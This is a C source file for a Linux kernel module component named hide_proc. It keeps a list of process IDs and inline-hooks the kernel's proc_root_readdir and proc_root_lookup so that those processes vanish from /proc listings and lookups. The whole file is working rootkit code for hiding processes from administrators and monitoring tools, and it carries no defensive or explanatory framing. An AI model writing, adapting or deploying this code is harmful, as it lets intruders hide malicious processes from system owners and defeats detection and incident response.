#include "hide_proc.h"
#include "inline_hook/p_lkrg_main.h"
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/spinlock.h>

// --- PID list management (copied from original) ---
struct hidden_pid_entry {
    struct list_head list;
    pid_t pid;
};

static LIST_HEAD(hidden_pids);
static DEFINE_SPINLOCK(hidden_lock);

bool is_pid_hidden(pid_t pid) {
    struct hidden_pid_entry *entry;
    bool found = false;

    spin_lock(&hidden_lock);
    list_for_each_entry(entry, &hidden_pids, list) {
        if (entry->pid == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&hidden_lock);

    return found;
}

void add_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *new_entry;

    if (is_pid_hidden(pid))
        return;

    new_entry = kmalloc(sizeof(struct hidden_pid_entry), GFP_KERNEL);
    if (!new_entry)
        return;

    new_entry->pid = pid;

    spin_lock(&hidden_lock);
    list_add(&new_entry->list, &hidden_pids);
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Added PID %d to hidden list\n", pid);
}

void remove_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            printk(KERN_INFO "[hide_proc] Removed PID %d from hidden list\n", pid);
            break;
        }
    }
    spin_unlock(&hidden_lock);
}

void clear_hidden_pids(void) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
}


// --- New implementation using inline_hook engine ---

// --- Hook for readdir ---

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)

// Forward declaration to solve circular dependency
static struct p_hook_struct p_proc_root_readdir_hook;

static int (*original_proc_root_readdir)(struct file *, struct dir_context *);

struct hooked_dir_context {
    struct dir_context original;
    struct dir_context *original_ctx;
};

static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen,
                          loff_t offset, u64 ino, unsigned int d_type) {
    struct hooked_dir_context *hooked_ctx = container_of(ctx, struct hooked_dir_context, original);
    char *endptr;
    long pid;

    if (name) {
        pid = simple_strtol(name, &endptr, 10);
        if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
            return 0; // Skip this entry
        }
    }

    return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
}

static int hooked_proc_root_readdir(struct file *file, struct dir_context *ctx)
{
    struct hooked_dir_context hooked_ctx;
    int ret;

    original_proc_root_readdir = (void*)p_proc_root_readdir_hook.stub->orig;

    if (!ctx || !ctx->actor) {
        return original_proc_root_readdir(file, ctx);
    }

    hooked_ctx.original_ctx = ctx;
    memcpy(&hooked_ctx.original, ctx, sizeof(struct dir_context));
    *(filldir_t *)(&hooked_ctx.original.actor) = hooked_filldir;

    ret = original_proc_root_readdir(file, &hooked_ctx.original);

    ctx->pos = hooked_ctx.original.pos;

    return ret;
}

static char p_proc_root_readdir_hook_state = 0;
static struct p_hook_struct p_proc_root_readdir_hook = {
    .name = "proc_root_readdir",
    .entry_fn = hooked_proc_root_readdir,
};
GENERATE_INSTALL_FUNC(proc_root_readdir)

#endif

// --- Hook for lookup ---

// Forward declaration
static struct p_hook_struct p_proc_root_lookup_hook;

static struct dentry * (*original_proc_root_lookup)(struct inode *,struct dentry *, unsigned int);

static struct dentry * hooked_proc_root_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags)
{
    char *endptr;
    long pid;
    const char *name;

    if (dentry && dentry->d_name.name) {
        name = dentry->d_name.name;
        pid = simple_strtol(name, &endptr, 10);
        if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
            return ERR_PTR(-ENOENT);
        }
    }

    original_proc_root_lookup = (void*)p_proc_root_lookup_hook.stub->orig;
    return original_proc_root_lookup(dir, dentry, flags);
}

static char p_proc_root_lookup_hook_state = 0;
static struct p_hook_struct p_proc_root_lookup_hook = {
    .name = "proc_root_lookup",
    .entry_fn = hooked_proc_root_lookup,
};
GENERATE_INSTALL_FUNC(proc_root_lookup)


// --- Init and Exit functions ---

int hide_proc_init(void) {
    printk(KERN_INFO "[hide_proc] Initializing process hiding (via inline hook)\n");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    if (p_install_proc_root_readdir_hook(0) != 0) {
        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_readdir.\n");
        return -EFAULT;
    }
#endif

    if (p_install_proc_root_lookup_hook(0) != 0) {
        printk(KERN_ERR "[hide_proc] Failed to hook proc_root_lookup.\n");
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
        p_uninstall_proc_root_readdir_hook(); // Clean up previous hook
#endif
        return -EFAULT;
    }

    printk(KERN_INFO "[hide_proc] Successfully hooked /proc operations.\n");
    return 0;
}

void hide_proc_exit(void) {
    printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring hooks)\n");
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    p_uninstall_proc_root_readdir_hook();
#endif
    p_uninstall_proc_root_lookup_hook();
    clear_hidden_pids();
}